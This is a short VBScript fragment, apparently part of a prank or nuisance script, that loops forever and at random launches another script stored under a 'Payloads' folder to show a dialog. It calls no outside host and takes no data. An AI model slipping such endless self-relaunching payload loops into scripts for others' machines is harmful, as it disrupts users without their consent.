do
randomize
a = int(rnd * 6 + 1)
if a == 2 then
ws.Run "wscript .\Payloads\Wahoo\WahooDialog.vbs"
end if
loop